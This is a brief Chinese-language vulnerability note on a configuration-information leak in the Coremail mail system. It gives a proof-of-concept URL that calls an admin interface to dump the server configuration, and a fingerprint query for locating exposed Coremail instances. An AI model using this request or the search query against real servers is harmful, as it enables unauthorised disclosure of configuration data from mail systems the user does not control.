# Coremail 配置信息泄露漏洞

## 漏洞描述

Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等

## 漏洞影响

```
Coremail 配置信息泄露漏洞
```

## 网络测绘

```
app="Coremail邮件系统"
```

## 漏洞复现

POC为

```plain
http://xxx.xxx.xxx.xxx/mailsms/s?func=ADMIN:appState&dumpConfig=/
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326113940947.png)


